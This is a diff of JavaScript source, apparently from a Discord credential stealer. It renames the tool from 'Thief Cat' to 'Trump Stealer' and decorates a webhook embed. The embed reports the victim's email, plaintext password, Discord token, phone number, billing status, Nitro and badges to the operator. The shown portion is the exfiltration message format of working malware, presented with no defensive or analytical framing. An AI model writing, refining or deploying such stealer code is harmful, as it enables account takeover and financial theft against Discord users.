@@ -637,11 +637,11 @@ const login = async (email, password, token) => {
       avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
       embeds: [
         {
-          title: '🐾 Thief Cat User Login',
+          title: '<a:trump:1342979705174884372> Trump Stealer Login',
           color: 5639644,
           fields: [
             {
-              name: 'Download pfp',
+              name: 'Profile Picture',
               value: `[Download pfp](${avatarUrl})`,
               inline: false
             },
@@ -656,42 +656,42 @@ const login = async (email, password, token) => {
               inline: true
             },
             {
-              name: 'Nitro',
+              name: 'Nitro <a:nitro:1130453517312725052>',
               value: `${nitro}`,
               inline: true
             },
             {
-              name: 'Badges',
+              name: 'Badges <a:badges:1130448593715740692>',
               value: `${badges}`,
               inline: true
             },
             {
-              name: 'Language',
+              name: 'Language <:4533language:1130453119919206500>',
               value: `${json.locale}`,
               inline: true
             },
             {
-              name: 'Phone',
+              name: 'Phone <a:phone:1343560504437768338>',
               value: `${phone}`,
               inline: true
             },
             {
-              name: 'Billing',
+              name: 'Billing <a:CC:1343558993452208128>',
               value: `${billing}`,
               inline: true
             },
             {
-              name: 'Email',
+              name: 'Email <a:Mail:1343558994828071042>',
               value: `\`${email}\``,
               inline: true
             },
             {
-              name: 'Password',
+              name: 'Password <a:Pass:1343559983765393470>',
               value: `\`${password}\``,
               inline: true
             },
             {
-              name: 'Token',
+              name: 'Token <a:Token:1343559982138003466>',
               value: `\`\`\`${token}\`\`\``,
               inline: false
             }
@@ -700,7 +700,7 @@ const login = async (email, password, token) => {
             url: avatarUrl
           },
           footer: {
-            text: 'Thief Cat 2023 | https://github.com/FalseKSCH/',
+            text: 'Trump Stealer',
           }
         }
       ]
